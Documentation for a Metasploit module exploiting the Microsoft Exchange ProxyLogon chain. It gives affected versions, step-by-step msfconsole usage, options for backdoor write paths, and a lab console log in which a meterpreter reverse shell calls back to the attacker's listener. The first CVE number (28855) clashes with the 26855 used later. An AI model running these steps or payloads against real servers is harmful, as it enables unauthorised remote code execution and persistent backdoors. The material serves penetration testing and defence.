## Vulnerable Application

CVE-2021-28855 is a pre-authentication SSRF (Server Side Request Forgery) which allows an attacker to
bypass authentication by sending specially crafted HTTP requests. This vulnerability is part of an attack
chain used to perform an RCE (Remote Code Execution).

CVE-2021-27065 is a post-auth arbitrary-file-write vulnerability to get code execution and the second part
of ProxyLogon attack chain.

This vulnerability affects (Exchange 2013 Versions < 15.00.1497.012, Exchange 2016 CU18 < 15.01.2106.013,
Exchange 2016 CU19 < 15.01.2176.009, Exchange 2019 CU7 < 15.02.0721.013, Exchange 2019 CU8 < 15.02.0792.010).

### Introduction

This module exploit a vulnerability on Microsoft Exchange Server that allows an attacker bypassing the
authentication, impersonating as the admin (CVE-2021-26855) and write arbitrary file (CVE-2021-27065) to
get the RCE (Remote Code Execution).

By taking advantage of this vulnerability, you can execute arbitrary commands on the remote Microsoft
Exchange Server.

All components are vulnerable by default.

## Verification Steps

1. Start msfconsole
2. Do: `use exploit/windows/http/exchange_proxylogon_rce`
3. Do: `set RHOSTS [IP]`
4. Do: `set EMAIL [EMAIL ADDRESS]`
5. Do: `run`

## Options

### EMAIL

A known email address for this organization.

### METHOD

HTTP Method to use for the check (only). Default: POST

### UseAlternatePath

Use the IIS root dir as alternate path. Default: false

## Advanced Options

### ExchangeBasePath

The base path where exchange is installed. Default: C:\Program Files\Microsoft\Exchange Server\V15

### ExchangeWritePath

The path where you want to write the backdoor. Default: owa\auth

You can for example, define to: ecp\auth

### IISBasePath

The base path where IIS wwwroot directory is. Default: C:\inetpub\wwwroot

### IISWritePath

The path where you want to write the backdoor. Default: aspnet_client

### MapiClientApp

This is MAPI client version sent in the request.

### MaxWaitLoop

Max counter loop to wait for OAB Virtual Dir reset. Default: 30

## Known issues

1. With `cmd/windows/adduser` payload, you may need to change the password because the default password does may
not meet Microsoft Windows complexity requirements.
2. Depending on the payload used, two `cmd.exe` processes remain alive on the server. If this is the case, you cannot
make another attempt if they are not killed.

## Scenarios

```
msf6 exploit(windows/http/exchange_proxylogon_rce) > options 

Module options (exploit/windows/http/exchange_proxylogon_rce):

   Name              Current Setting           Required  Description
   ----              ---------------           --------  -----------
   EMAIL             gaston.lagaffe@pwned.lab  yes       A known email address for this organization
   METHOD            POST                      yes       HTTP Method to use for the check (Accepted: GET, POST)
   Proxies                                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS            172.20.2.112              yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT             443                       yes       The target port (TCP)
   SRVHOST           0.0.0.0                   yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT           8080                      yes       The local port to listen on.
   SSL               true                      no        Negotiate SSL/TLS for outgoing connections
   SSLCert                                     no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                                     no        The URI to use for this exploit (default is random)
   UseAlternatePath  false                     yes       Use the IIS root dir as alternate path
   VHOST                                       no        HTTP server virtual host


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     172.20.2.12      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows Powershell


msf6 exploit(windows/http/exchange_proxylogon_rce) > run

[*] Started reverse TCP handler on 172.20.2.12:4444 
[*] Executing automatic check (disable AutoCheck to override)
[*] Using auxiliary/scanner/http/exchange_proxylogon as check
[+] https://172.20.2.112:443 - The target is vulnerable to CVE-2021-26855.
[*] Scanned 1 of 1 hosts (100% complete)
[+] The target is vulnerable.
[*] https://172.20.2.112:443 - Attempt to exploit for CVE-2021-26855
[*] Internal server name (EX02)
[*] https://172.20.2.112:443 - Sending autodiscover request
[*] Server: c7f46eae-bac1-49e7-8502-afe90609ea7f@pwned.lab
[*] LegacyDN: /o=Pwned Exch2k13-HA/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Recipients/cn=683c605c88c14fcca1f5e74d0d136461-Gaston
[*] https://172.20.2.112:443 - Sending mapi request
[*] SID: S-1-5-21-3876225949-3666446388-246247518-1156 (gaston.lagaffe@pwned.lab)
[*] https://172.20.2.112:443 - Sending ProxyLogon request
[*] Try to get a good msExchCanary (by patching user SID method)
[*] ASP.NET_SessionId: 3ae8f52c-0bf6-4162-9c0b-0109a14e3e4d
[*] msExchEcpCanary: lKd1HMX_BUeIdxUPUn1DSb-NkT8e7tgI4QztptiaeDm3UQXooMuAWr7VCMvS2PD48epSe1wUS50.
[*] OAB id: ef3febbd-6cdf-4dd4-8dbb-f4376d8cc591 (OAB (Default Web Site))
[*] https://172.20.2.112:443 - Attempt to exploit for CVE-2021-27065
[*] Prepare the payload on the remote target
[*] Write the payload on the remote target
[!] Wait a lot (0)
[+] Yeeting windows/x64/meterpreter/reverse_tcp payload at 172.20.2.112:443
[*] Sending stage (200262 bytes) to 172.20.2.112
[*] Meterpreter session 17 opened (172.20.2.12:4444 -> 172.20.2.112:25626) at 2021-03-21 21:08:23 +0400
[*] Sending stage (200262 bytes) to 172.20.2.112
[*] Meterpreter session 18 opened (172.20.2.12:4444 -> 172.20.2.112:25627) at 2021-03-21 21:08:23 +0400
[+] Deleted C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\mmjhfIC.aspx

meterpreter > 
```

## References

1. <https://proxylogon.com/>
2. <http://aka.ms/exchangevulns>
3. <https://www.praetorian.com/blog/reproducing-proxylogon-exploit>
4. <https://testbnull.medium.com/ph%C3%A2n-t%C3%ADch-l%E1%BB%97-h%E1%BB%95ng-proxylogon-mail-exchange-rce-s%E1%BB%B1-k%E1%BA%BFt-h%E1%BB%A3p-ho%C3%A0n-h%E1%BA%A3o-cve-2021-26855-37f4b6e06265>
